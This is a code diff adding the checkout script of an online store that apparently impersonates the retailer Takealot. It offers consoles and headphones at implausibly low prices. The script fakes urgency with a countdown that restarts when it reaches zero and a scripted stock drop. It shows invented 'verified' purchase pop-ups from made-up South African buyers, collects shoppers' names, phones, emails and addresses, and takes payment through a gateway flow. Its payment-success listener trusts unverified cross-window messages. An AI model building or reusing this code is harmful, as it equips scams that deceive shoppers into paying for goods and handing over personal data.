+      <div class="creapay-iframe-wrapper">
+        <iframe id="creaPayFrame" src="about:blank" allow="payment; camera; microphone"></iframe>
+      </div>
+    </div>
+  </div>
+
+  <!-- Dynamic Product, Quantity, Urgency & Social Proof Logic -->
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const pSlug = (urlParams.get('p') || 'jbl-charge-6').toLowerCase();
+    const colorParam = (urlParams.get('color') || 'Space Grey');
+    let quantity = Math.max(1, Math.min(3, parseInt(urlParams.get('qty') || '1', 10) || 1));
+
+    let basePrice = 297;
+    let oldPrice = 2499;
+    let shortModelName = "JBL Charge 6";
+    let productName = "JBL Charge 6 Waterproof Portable Bluetooth Speaker (" + colorParam + ")";
+    let productImg = "images/charge6_black.jpg";
+    let returnUrl = 'jbl_charge_6.html';
+
+    if (pSlug.includes('ps5') || pSlug.includes('playstation') || pSlug.includes('gta')) {
+      basePrice = 1999;
+      oldPrice = 14499;
+      shortModelName = "PS5 Slim + GTA 6";
+      returnUrl = 'playstation_5_gta6.html';
+      productName = "Sony PlayStation 5 Slim 500GB Console + Grand Theft Auto VI (GTA 6) Limited Bundle";
+      productImg = 'images/ps5_gta6_hero.jpg';
+    } else if (pSlug.includes('airpod') || pSlug.includes('max') || pSlug.includes('397')) {
+      basePrice = 397;
+      oldPrice = 11999;
+      shortModelName = "Apple AirPods Max";
+      returnUrl = 'apple_airpods_max.html';
+
+      const cLower = colorParam.toLowerCase();
+      let colorClean = 'Space Grey';
+      let imgPath = '/deals/user_ads/airpods_space_grey.jpg';
+
+      if (cLower.includes('silver') || cLower.includes('white')) {
+        colorClean = 'Silver';
+        imgPath = '/deals/user_ads/airpods_silver.jpg';
+      } else if (cLower.includes('sky') || cLower.includes('blue')) {
+        colorClean = 'Sky Blue';
+        imgPath = '/deals/user_ads/airpods_skyblue.jpg';
+      } else if (cLower.includes('pink') || cLower.includes('rose') || cLower.includes('red')) {
+        colorClean = 'Pink';
+        imgPath = '/deals/user_ads/airpods_pink.jpg';
+      } else if (cLower.includes('green') || cLower.includes('mint')) {
+        colorClean = 'Green';
+        imgPath = '/deals/user_ads/airpods_green.jpg';
+      } else {
+        colorClean = 'Space Grey';
+        imgPath = '/deals/user_ads/airpods_space_grey.jpg';
+      }
+
+      productName = "Apple AirPods Max Wireless Over-Ear Active Noise Cancelling Headphones (" + colorClean + ")";
+      productImg = imgPath;
+    } else if (pSlug.includes('go-4') || pSlug.includes('go4')) {
+      basePrice = 197;
+      oldPrice = 999;
+      shortModelName = "JBL Go 4";
+      returnUrl = 'jbl_go_4.html';
+      productName = "JBL Go 4 Ultra-Portable Waterproof Bluetooth Speaker (" + colorParam + ")";
+      productImg = "images/go4_black.jpg";
+      if (colorParam.toLowerCase().includes('blue')) {
+        productImg = 'images/go4_blue.jpg';
+      } else if (colorParam.toLowerCase().includes('red')) {
+        productImg = 'images/go4_red.jpg';
+      } else if (colorParam.toLowerCase().includes('camo')) {
+        productImg = 'images/go4_camo.jpg';
+      }
+    } else if (pSlug === 'combo' || pSlug === 'kitchen-combo') {
+      basePrice = 297;
+      oldPrice = 3750;
+      shortModelName = "3-in-1 Combo";
+      returnUrl = 'combo.html';
+      productName = "3-in-1 Kitchen Combo: Russell Hobbs Air Fryer + Defy Microwave + Mellerware Kettle";
+      productImg = "images/combo-main.jpg";
+    } else {
+      // Default: JBL Charge 6
+      basePrice = 297;
+      oldPrice = 2499;
+      shortModelName = "JBL Charge 6";
+      returnUrl = 'jbl_charge_6.html';
+      productName = "JBL Charge 6 Waterproof Portable Bluetooth Speaker (" + colorParam + ")";
+      productImg = "images/charge6_black.jpg";
+      if (colorParam.toLowerCase().includes('blue')) {
+        productImg = 'images/charge6_blue.jpg';
+      } else if (colorParam.toLowerCase().includes('red')) {
+        productImg = 'images/charge6_red.jpg';
+      } else if (colorParam.toLowerCase().includes('camo')) {
+        productImg = 'images/charge6_camo.jpg';
+      }
+    }
+
+    document.getElementById('productTitle').textContent = productName;
+    document.getElementById('productImg').src = productImg;
+    document.getElementById('priceDisplay').textContent = "R " + basePrice;
+    document.getElementById('oldPriceDisplay').textContent = "R " + oldPrice.toLocaleString();
+
+    // Setup Quantity Cards Pricing
+    document.getElementById('cardPrice1').textContent = "R " + (basePrice * 1);
+    document.getElementById('cardPrice2').textContent = "R " + (basePrice * 2);
+    document.getElementById('cardPrice3').textContent = "R " + (basePrice * 3);
+
+    document.getElementById('cardSave1').textContent = "Save R " + ((oldPrice - basePrice) * 1).toLocaleString();
+    document.getElementById('cardSave2').textContent = "Save R " + ((oldPrice - basePrice) * 2).toLocaleString();
+    document.getElementById('cardSave3').textContent = "Save R " + ((oldPrice - basePrice) * 3).toLocaleString();
+
+    const brandLink = document.getElementById('brandLogoLink');
+    if (brandLink) {
+      const search = window.location.search;
+      brandLink.href = returnUrl + (search ? search : '');
+    }
+
+    const stepCart = document.getElementById('stepCart');
+    if (stepCart) {
+      stepCart.onclick = function() {
+        const search = window.location.search;
+        window.location.href = returnUrl + (search ? search : '');
+      };
+    }
+
+    // Quantity Selector Logic
+    function updateQuantityUI() {
+      const total = basePrice * quantity;
+      document.getElementById('qtyDisplay').textContent = quantity;
+      document.getElementById('labelSubtotal').textContent = `Item Subtotal (${quantity} unit${quantity > 1 ? 's' : ''})`;
+      document.getElementById('calcSubtotal').textContent = "R " + total + ".00";
+      document.getElementById('calcTotal').textContent = "R " + total + ".00";
+      document.getElementById('submitBtn').innerHTML = `<span>PROCEED TO SECURE PAYMENT (R ${total}.00) →</span>`;
+
+      // Update card active classes
+      for (let i = 1; i <= 3; i++) {
+        const card = document.getElementById('cardQty' + i);
+        if (card) {
+          card.classList.toggle('active', i === quantity);
+        }
+      }
+
+      // Stepper button disabled states
+      const btnMinus = document.getElementById('btnQtyMinus');
+      const btnPlus = document.getElementById('btnQtyPlus');
+      const limitAlert = document.getElementById('qtyLimitAlert');
+
+      if (btnMinus) btnMinus.disabled = (quantity <= 1);
+      if (btnPlus) btnPlus.disabled = (quantity >= 3);
+      if (limitAlert) limitAlert.style.display = (quantity >= 3) ? 'block' : 'none';
+
+      return total;
+    }
+
+    function selectQty(q) {
+      quantity = Math.max(1, Math.min(3, q));
+      updateQuantityUI();
+    }
+
+    function changeQty(delta) {
+      const newQty = quantity + delta;
+      if (newQty >= 1 && newQty <= 3) {
+        quantity = newQty;
+        updateQuantityUI();
+      }
+    }
+
+    // Initialize UI with initial quantity
+    const initialTotal = updateQuantityUI();
+
+    // Send Dynamic InitiateCheckout with accurate product details
+    if (window.fbq) {
+      try {
+        fbq('track', 'InitiateCheckout', {
+          value: initialTotal,
+          currency: 'ZAR',
+          content_name: `${quantity}x ${productName}`,
+          content_type: 'product',
+          num_items: quantity
+        });
+      } catch(e) {}
+    }
+
+    // --- URGENCY COUNTDOWN TIMER (10:00 countdown) ---
+    (function initCountdownTimer() {
+      let secondsLeft = 588; // 9 min 48 sec
+      const timerDisplay = document.getElementById('timerDisplay');
+      const stockCount = document.getElementById('stockCount');
+
+      const interval = setInterval(function() {
+        secondsLeft--;
+        if (secondsLeft <= 0) {
+          secondsLeft = 300; // loop back to 5 mins if zero
+        }
+        const m = Math.floor(secondsLeft / 60);
+        const s = secondsLeft % 60;
+        if (timerDisplay) {
+          timerDisplay.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+        }
+
+        // Random subtle stock decrease simulation
+        if (secondsLeft === 420 && stockCount) {
+          stockCount.textContent = '3';
+        } else if (secondsLeft === 180 && stockCount) {
+          stockCount.textContent = '2';
+        }
+      }, 1000);
+    })();
+
+    // --- LIVE SOCIAL PROOF NOTIFICATIONS (South African Purchases) ---
+    const southAfricanSales = [
+      { name: "Bongani M.", city: "Johannesburg, GP", qty: 2, time: "14 seconds ago", initials: "BM" },
+      { name: "Sipho D.", city: "Cape Town, WC", qty: 1, time: "32 seconds ago", initials: "SD" },
+      { name: "Johan V.", city: "Pretoria, GP", qty: 3, time: "48 seconds ago", initials: "JV" },
+      { name: "Nandi K.", city: "Durban, KZN", qty: 2, time: "1 minute ago", initials: "NK" },
+      { name: "Lerato M.", city: "Centurion, GP", qty: 1, time: "1 minute ago", initials: "LM" },
+      { name: "Thabo N.", city: "Soweto, GP", qty: 2, time: "2 minutes ago", initials: "TN" },
+      { name: "Willem v/d M.", city: "Bloemfontein, FS", qty: 3, time: "2 minutes ago", initials: "WM" },
+      { name: "Zanele S.", city: "Port Elizabeth, EC", qty: 1, time: "3 minutes ago", initials: "ZS" },
+      { name: "Dewald K.", city: "Stellenbosch, WC", qty: 2, time: "3 minutes ago", initials: "DK" },
+      { name: "Kagiso P.", city: "Midrand, GP", qty: 1, time: "4 minutes ago", initials: "KP" }
+    ];
+
+    let toastIndex = 0;
+    let toastTimeout = null;
+
+    function showSalesToast() {
+      const toast = document.getElementById('salesToast');
+      if (!toast) return;
+
+      const sale = southAfricanSales[toastIndex % southAfricanSales.length];
+      toastIndex++;
+
+      document.getElementById('toastAvatar').textContent = sale.initials;
+      document.getElementById('toastTitle').textContent = `${sale.name} from ${sale.city}`;
+      document.getElementById('toastDesc').textContent = `Just bought ${sale.qty}x ${shortModelName} (${sale.qty === 3 ? 'Max Limit' : 'Verified'})`;
+      document.getElementById('toastTime').textContent = sale.time;
+
+      toast.classList.add('show');
+
+      // Hide after 4.5 seconds
+      toastTimeout = setTimeout(function() {
+        toast.classList.remove('show');
+      }, 4500);
+    }
+
+    function dismissToast() {
+      const toast = document.getElementById('salesToast');
+      if (toast) toast.classList.remove('show');
+      if (toastTimeout) clearTimeout(toastTimeout);
+    }
+
+    // Start toast interval after 3.5 seconds, then every 8.5 seconds
+    setTimeout(function() {
+      showSalesToast();
+      setInterval(showSalesToast, 8500);
+    }, 3500);
+
+    // --- MODAL CONTROL FUNCTIONS ---
+    function openCreaPayModal(url) {
+      const modal = document.getElementById('creaPayModal');
+      const iframe = document.getElementById('creaPayFrame');
+      const loader = document.getElementById('modalIframeLoader');
+
+      if (loader) loader.style.display = 'block';
+      if (iframe) {
+        iframe.src = url;
+        iframe.onload = function() {
+          if (loader) loader.style.display = 'none';
+        };
+      }
+      if (modal) modal.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeCreaPayModal() {
+      const modal = document.getElementById('creaPayModal');
+      const iframe = document.getElementById('creaPayFrame');
+      if (modal) modal.style.display = 'none';
+      if (iframe) iframe.src = 'about:blank';
+      document.body.style.overflow = '';
+      const btn = document.getElementById('submitBtn');
+      if (btn) {
+        btn.disabled = false;
+        updateQuantityUI();
+      }
+    }
+
+    function handleOverlayClick(event) {
+      if (event.target === document.getElementById('creaPayModal')) {
+        closeCreaPayModal();
+      }
+    }
+
+    // Strict Verified Message listener for payment completion inside iframe
+    // Strict Verified Message listener for payment completion inside iframe
+    window.addEventListener('message', function(event) {
+      if (!event || !event.data) return;
+      try {
+        const data = typeof event.data === 'object' ? event.data : JSON.parse(event.data);
+        const isVerified = (
+          data.event === 'charge:success' || 
+          data.event === 'payment_success' ||
+          data.type === 'paystack:charge_success' ||
+          (data.status === 'approved' && data.reference && data.reference.startsWith('PS-'))
+        );
+        if (isVerified) {
+          const finalAmount = updateQuantityUI();
+          if (window.fbq) {
+            try {
+              fbq('track', 'Purchase', {
+                value: finalAmount,
+                currency: 'ZAR',
+                content_name: `${quantity}x ${productName}`,
+                content_type: 'product',
+                num_items: quantity
+              });
+            } catch(e) {}
+          }
+          window.location.href = `track.html?ref=${encodeURIComponent(data.reference || 'TK-CONFIRMED')}&amount=${finalAmount}&qty=${quantity}&p=${pSlug}`;
+        }
+      } catch(e) {}
+    });
+
+    // --- FORM SUBMISSION & PAYMENT PROCESSING ---
+    
+    // Auto-fill from URL params (Cart Recovery)
+    try {
+      if (urlParams.get('name')) {
+        const el = document.getElementById('fullName');
+        if (el) el.value = urlParams.get('name');
+      }
+      if (urlParams.get('phone')) {
+        const el = document.getElementById('phone');
+        if (el) el.value = urlParams.get('phone');
+      }
+      if (urlParams.get('email')) {
+        const el = document.getElementById('email');
+        if (el) el.value = urlParams.get('email');
+      }
+    } catch(e) {}
+
+    const form = document.getElementById('addressForm');
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const fullName = document.getElementById('fullName').value.trim() || 'Customer';
+      const phone = document.getElementById('phone').value.trim() || '0821234567';
+      const email = document.getElementById('email').value.trim() || '';
+      const streetAddress = document.getElementById('streetAddress').value.trim();
+      const suburb = document.getElementById('suburb').value.trim();
+      const city = document.getElementById('city').value.trim();
+      const province = document.getElementById('province').value;
+      const fullAddress = `${streetAddress}, ${suburb}, ${city}, ${province}`;
+      const finalAmount = updateQuantityUI();
+      const orderId = 'TK-' + Math.floor(100000 + Math.random() * 900000);
+
+      // Fire Meta Pixel InitiateCheckout & AddPaymentInfo
+      if (window.fbq) {
+        try {
+          fbq('track', 'AddPaymentInfo', {
+            value: finalAmount,
+            currency: 'ZAR',
+            content_name: `${quantity}x ${productName}`,
+            content_type: 'product',
+            num_items: quantity
+          });
+          fbq('track', 'InitiateCheckout', {
+            value: finalAmount,
+            currency: 'ZAR',
+            content_name: `${quantity}x ${productName}`,
+            content_type: 'product',
+            num_items: quantity
+          });
+        } catch(e) {}
+      }
+
+      const btn = document.getElementById('submitBtn');
+      const originalText = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = '<span>🔒 CONNECTING TO SECURE PAYMENT SWITCH...</span>';
+
+      const utms = {
+        utm_source: urlParams.get('utm_source') || '',
+        utm_medium: urlParams.get('utm_medium') || '',
+        utm_campaign: urlParams.get('utm_campaign') || '',
+        utm_content: urlParams.get('utm_content') || '',
+        utm_term: urlParams.get('utm_term') || '',
+        fbclid: urlParams.get('fbclid') || ''
+      };
+
+      const recordAndComplete = function() {
+        if (window.fbq) {
+          try {
+            fbq('track', 'Purchase', {
+              value: finalAmount,
+              currency: 'ZAR',
+              content_name: `${quantity}x ${productName}`,
+              content_type: 'product',
+              num_items: quantity
+            });
+          } catch(e) {}
+        }
+        try {
+          fetch('api/send_takealot_order_email.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              order_id: orderId,
+              name: fullName,
+              phone: phone,
+              email: email,
+              address: fullAddress,
+              amount: finalAmount,
+              qty: quantity,
+              p: pSlug
+            })
+          }).catch(() => {});
+        } catch(e) {}
+        window.location.href = `track.html?ref=${encodeURIComponent(orderId)}&amount=${encodeURIComponent(finalAmount)}&qty=${encodeURIComponent(quantity)}&name=${encodeURIComponent(fullName)}&phone=${encodeURIComponent(phone)}&email=${encodeURIComponent(email)}&address=${encodeURIComponent(fullAddress)}&p=${encodeURIComponent(pSlug)}`;
+      };
+
+      try {
+        const apiOrderUrl = 'api/create-order.php';
+        const resp = await fetch(apiOrderUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            order_id: orderId,
+            name: fullName,
+            phone: phone,
+            email: email,
+            address: fullAddress,
+            bank: 'Capitec / SA Banks',
+            quantity: quantity,
+            amount_minor: finalAmount * 100,
+            title: `Takealot: ${quantity}x ${productName}`,
+            utms: utms
+          })
+        });
+
+        if (!resp.ok) throw new Error("Order creation failed");
+        const order = await resp.json();
+        console.log("[Payment Order Response]", order);
+
+        if (order && (order.access_code || order.checkout_token)) {
+          btn.innerHTML = '<span>⚡ OPENING SECURE CHECKOUT...</span>';
+
+          // 1. Direct Native Popup via access_code
+          if (order.access_code && window.PaystackPop) {
+            try {
+              const popup = new window.PaystackPop();
+              popup.resumeTransaction(order.access_code, {
+                onSuccess: function() {
+                  btn.innerHTML = '<span>✓ PAYMENT SUCCESSFUL!</span>';
+                  recordAndComplete();
+                },
+                onCancel: function() {
+                  btn.disabled = false;
+                  btn.innerHTML = originalText;
+                }
+              });
+              return;
+            } catch(e) {
+              console.warn("Direct popup failed, trying CreaPay engine:", e);
+            }
+          }
+
+          // 2. Native Engine with accessCode and checkoutToken
+          if (window.CreaPay && typeof window.CreaPay.pay === 'function' && order.checkout_token) {
+            try {
+              const res = await window.CreaPay.pay({
+                checkoutToken: order.checkout_token,
+                orderId: order.order_id,
+                accessCode: order.access_code,
+                onStatus: function(statusState) {
+                  console.log("[Payment onStatus]", statusState);
+                  if (statusState && (statusState.status === 'approved' || statusState.status === 'success')) {
+                    btn.innerHTML = '<span>✓ PAYMENT SUCCESSFUL!</span>';
+                    recordAndComplete();
+                  }
+                }
+              });
+
+              if (res && (res.status === 'approved' || res.status === 'success')) {
+                btn.innerHTML = '<span>✓ PAYMENT SUCCESSFUL!</span>';
+                recordAndComplete();
+                return;
+              } else if (res && (res.status === 'cancelled' || res.status === 'closed')) {
+                btn.disabled = false;
+                btn.innerHTML = originalText;
+                return;
+              }
+            } catch(e) {
+              console.warn("CreaPay.pay error, opening modal:", e);
+            }
+          }
+
+          // 3. Fallback: Inline Lightbox Modal (Iframe directly on screen)
+          const checkoutUrl = (order && order.checkout_url)
+            ? order.checkout_url
+            : (order.access_code ? ('https://checkout.paystack.com/' + order.access_code) : '');
+
+          if (checkoutUrl) {
+            btn.innerHTML = '<span>🔒 SECURE CHECKOUT READY</span>';
+            openCreaPayModal(checkoutUrl);
+            return;
+          }
+
+          btn.disabled = false;
+          btn.innerHTML = originalText;
+        } else {
+          throw new Error("No gateway access code received");
+        }
+
+      } catch (err) {
+        console.error("Checkout process error:", err);
+        btn.disabled = false;
+        btn.innerHTML = originalText;
+
+        if (typeof order !== 'undefined' && order && (order.access_code || order.checkout_url)) {
+          const fallbackUrl = order.checkout_url || ('https://checkout.paystack.com/' + order.access_code);
+          openCreaPayModal(fallbackUrl);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
